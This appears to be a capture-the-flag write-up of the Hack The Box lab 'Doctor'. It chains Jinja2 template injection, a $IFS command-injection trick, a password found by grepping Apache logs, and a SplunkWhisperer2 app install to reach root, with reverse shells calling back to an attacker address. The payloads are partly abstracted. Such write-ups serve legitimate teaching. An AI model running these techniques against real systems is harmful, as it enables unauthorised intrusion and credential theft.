---
layout: post
title: "The Intake Form Ran Your Code"
subtitle: "HTB Doctor, where a message board renders your post as a template, a forgotten log keeps a password, and Splunk runs whatever app you mail it"
date: 2021-02-13 12:00:00 +0000
description: "A healthcare message board renders your post title as a live template, a forgotten Apache log keeps a password in plain sight, and a root-run Splunk happily installs the app you send it."
image: /assets/og/the-intake-form-ran-your-code.png
tags: [hackthebox, writeup]
---

Doctor is a clinic, and a clinic runs on forms. You fill one out, hand it to the desk, and trust that somebody files it away as words. Doctor does not file your words away. It reads them back as instructions. The whole box is three rooms of that same mistake. A message board that renders your post title as a live template instead of as text. A log file that wrote down a password because nobody told it not to. And a Splunk daemon running as root that will install and run any little app you mail it, no questions asked. Nothing here is a memory-corruption magic trick. Every door is a piece of software that could not tell the difference between a thing to display and a thing to do.

```
        D O C T O R   C L I N I C
        =========================
        intake form:  title = {{ 7*7 }}
                      the board prints  49
                      (it did the math. it ran your words.)
                          |
                          v
        a reverse shell wearing a post title.
        then the old logs cough up a password,
        and splunk, still in its root coat,
        installs the app you handed it at the door.
                                            診
```

## 0x01 · the waiting room

`nmap -sC -sV` comes back with three open ports and a tidy little Linux story.

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
8089/tcp open  ssl/http Splunkd httpd
```

Port 80 is a polished landing page for the Doctor Secure Server, and it is mostly a brochure. The one useful thing on it is a contact address, `info@doctors.htb`. That second hostname matters. The page you are looking at lives on `doctor.htb`, but the email points at `doctors.htb`, plural, and a different name on the same machine usually means a different site behind it. Add `doctors.htb` to your hosts file, browse back, and the brochure is gone. In its place is a real application, a message board with registration and posts, built in Flask.

Hold port 8089 in the back of your mind. That is Splunk's management port, the REST API, and it does not become interesting until you have a password to feed it.

## 0x02 · the form that did arithmetic

The board lets you register, log in, and write posts with a title and a body. Any time an app takes text you typed and shows it back to you, there is a question worth asking. Is it showing me my text, or is it *running* my text. The way you ask that question is to type a little sum and see if the answer comes back done.

Put `{{7*'7'}}` in a post title. If the page prints `7777777`, the server did not store your title as a label. It handed it to its template engine, and Jinja2 (Flask's templating language) evaluated it like a formula. This is server-side template injection, SSTI, and it lives on the `/archive` route, where the code stitches your post titles into an RSS feed with `render_template_string` and never sanitizes a thing.

Think of it like a restaurant where the waiter reads your order card to the kitchen word for word. Normally you write "fish, no lemon." This kitchen will also obey "fish, and then unlock the safe," because the waiter never learned that part of the card was supposed to be just a dish. A template that runs is a waiter that reads everything aloud.

From a sum to a shell is a known walk in Jinja2. You climb Python's object graph from an empty tuple up to the base object, list its subclasses until you find one that can reach the `os` module, and pop a command. The payload is ugly but the idea is small.

```
{{ ().__class__.__base__.__subclasses__() ... ['__import__']('os')
   .popen( [ python3 reverse shell back to 10.10.14.4 on 443 ] ).read() }}
```

Start a listener, post the title, load `/archive`, and the board calls you back.

```
$ nc -lvnp 443
connect to [10.10.14.4] from doctors.htb 10.10.10.209
$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

You land as `web`. Read that group list twice, because the second name on it is the whole next act.

## 0x03 · the other unlocked door

Before we move on, Doctor leaves a second way into the exact same shell, and it is worth seeing because it is the same disease in a different organ. The post form has a feature that fetches URLs out of your post body. The code pulls anything URL-shaped with a regex and then runs `os.system` with a `curl` command built around it. A regex decides what *looks* like a URL. It does not decide what is *safe* to drop into a shell.

So you write a post containing a URL that is also a command. Shell metacharacters smuggle the real instruction in, and where a space would break the regex you use `$IFS`, the shell's own word-separator variable, as a stand-in.

```
http://10.10.14.4/$([ nc reverse shell to 10.10.14.4 on 443, with $IFS standing in for every space so the regex never sees one ])
```

The `$(...)` runs before `curl` ever gets going, and the same `web` shell drops into your listener. Two front doors, one mistake behind both. Input that was supposed to be inert, treated as live.

## 0x04 · the log that kept a secret

`web` cannot do much, but remember that group: `adm`. On a Debian-family box, membership in `adm` means you are allowed to read the system logs. Logs are where applications confess things in the middle of the night, and nobody reads them back. So you go reading.

```
web@doctor:/$ grep -ri passw /var/log 2>/dev/null
/var/log/apache2/backup: ... "POST /reset_password?email=Guitar123" 500 453
```

There it is, lying in a forgotten Apache log named `backup`. Somebody, while testing a password-reset feature, sent the reset request as a GET-style URL with the value in plain view, and Apache did what Apache always does. It wrote the whole request line to disk. The field is labeled `email`, but `Guitar123` is no email. It is a password that wandered into the wrong box on a form and got immortalized.

Picture a doctor's office with a security camera pointed at the sign-in clipboard. Nobody is watching the feed, but it records anyway, and three weeks later the tape still shows a patient writing their PIN in the name column. The log did not steal anything. It just never forgot.

There is a local user named `shaun`, and people put one password everywhere.

```
web@doctor:/$ su - shaun
Password: Guitar123
shaun@doctor:~$ cat user.txt
████████████████████████████████
```

## 0x05 · the app you mailed to root

Now port 8089 finally earns its keep. That is Splunk's management API, and Splunk on this box authenticates with `shaun` and `Guitar123`. The same password did a third job.

Here is the part that turns a login into a root shell. Splunk is built to be managed at scale, which means a Splunk instance is designed to receive *apps* (bundles of config and scripts) and run them. A scripted input is exactly what it sounds like, a script Splunk executes on a schedule. And on this box the Splunk service runs as root. So if you can get Splunk to accept an app, you can get root to run your script.

That is the entire idea behind SplunkWhisperer2. It packages a tiny malicious app whose scripted input is your payload, then uses the REST API to install it. Think of it like a hospital mailroom with a standing order to open every package addressed to it and follow the instructions inside. You do not have to break into the building. You just have to put a return address it recognizes on the box, and a senior staffer opens it for you.

```
$ python3 PySplunkWhisperer2_remote.py \
    --host 10.10.10.209 --lhost 10.10.14.4 \
    --username shaun --password Guitar123 \
    --payload "[ bash reverse shell back to 10.10.14.4 on 443 ]"

Creating malicious app bundle in: /tmp/iceberg
[+] Logging in
[+] Uploading app
[+] Installed, payload should fire
```

Start one more listener. Splunk installs the bundle, runs the scripted input as the user it lives as, and the shell that comes back is wearing the root coat.

```
$ nc -lvnp 443
connect to [10.10.14.4] from doctors.htb 10.10.10.209
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

It is easy to file Doctor under beginner trivia. Three steps, an easy rating, a password sitting in a log like a tooth under a pillow. But look at what actually connects the rooms, because it is the same hinge every time, and it is not a CVE you can patch on a Tuesday.

The SSTI is the injection family wearing a Jinja2 costume. Somewhere a program took a string a stranger typed and let part of that string reach into the engine and pull a lever. The post title was meant to be a label. It became a command because nobody drew a hard line between a thing to show and a thing to run. That line is the entire job, and it is the exact same line missed by the URL-fetching `curl` call one section later. Two bugs, one confession.

The log leak is scarier, because there is no bug at all. Apache logged a request line, which is its documented, correct, boring behavior. The vulnerability was a human putting a secret in a place that gets written down, and a second human reusing that secret three times. You cannot patch either of those. You can only stop putting secrets where the camera is pointed, and stop using one key for every lock.

And Splunk did nothing wrong in the strictest sense. Running apps is its whole purpose. The flaw is that the thing built to run anything was running as root, reachable by a password that had already escaped twice. A system that executes whatever it is handed is only ever as safe as the front door and the coat it is wearing. Doctor wears root, and left the door propped with a logfile.

## 0x07 · outro

```
the form was supposed to hold words.
it ran them, because nobody told it where text ends
and a command begins.

the log remembered a password no one meant to save.
the daemon opened the package because the package looked like work.
one key, three locks, all the way up to root.

draw the line. read your own logs before a stranger does. wear black.

                                                            EOF
```

---

*HTB: Doctor, retired 6 Feb 2021. An easy Linux box that is really a lecture on injection and reuse, dressed in a Jinja2 message board and a root-coated Splunk. The intake form still runs your code in a lab and nowhere you don't own.*